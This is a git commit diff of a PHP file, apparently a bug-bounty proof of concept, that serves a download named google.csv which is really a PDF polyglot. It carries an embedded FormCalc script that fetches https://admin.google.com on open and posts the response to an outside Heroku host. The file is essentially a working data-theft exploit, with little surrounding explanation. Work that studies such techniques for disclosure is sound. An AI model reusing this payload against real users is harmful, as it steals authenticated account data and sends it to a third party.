a976b10157dffbd9e9a41a04f1d9cb79dba21531
missoum1307 <missoum1307@users.noreply.github.com>
2018-09-03 18:59:20 +0100

    Update csv.php

--- csv.php
+++ csv.php
@@ -3,8 +3,6 @@ header('content-type: text/csv; charset=US-ASCII');
 header('content-disposition: attachment; filename="google.csv"');
 header('X-Content-Type-Options: nosniff');
 ?>
-Name,Given Name,Additional Name,Family Name,Yomi Name,Given Name Yomi,Additional Name Yomi,Family Name Yomi,Name Prefix,Name Suffix,Initials,Nickname,Short Name,Maiden Name,Birthday,Gender,Location,Billing Information,Directory Server,Mileage,Occupation,Hobby,Sensitivity,Priority,Subject,Notes,Group Membership
-,,,,,,,,,,,,,,,,,,,,,,,,,"%PDF-1.
 %PDF-1.
 1 0 obj <<>> stream
 <xdp:xdp xmlns:xdp='http://ns.adobe.com/xdp/'><config><present><pdf><interactive>1</interactive></pdf></present></config> <template><subform name='_'><pageSet/><field id='Hello World!'><event activity='initialize'><script contentType='application/x-formcalc'>var content = GET(""https://admin.google.com"") POST(""https://bughunt1307.herokuapp.com/post.php"",content)</script></event></field></subform></template></xdp:xdp>
